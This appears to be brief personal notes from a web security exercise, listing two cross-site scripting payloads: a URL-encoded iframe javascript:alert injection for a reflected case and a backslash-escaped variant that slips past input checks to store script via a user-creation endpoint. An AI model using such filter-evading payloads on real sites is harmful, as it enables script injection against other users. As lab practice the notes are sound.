### xss reflected
1. GET rest/api/call/ use URL encode for payload
%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E

### xxx persist
2. POST /api/Users/ use \ to cover params payload pass check.
<iframe src=\"javascript:alert(`xss2`)\">
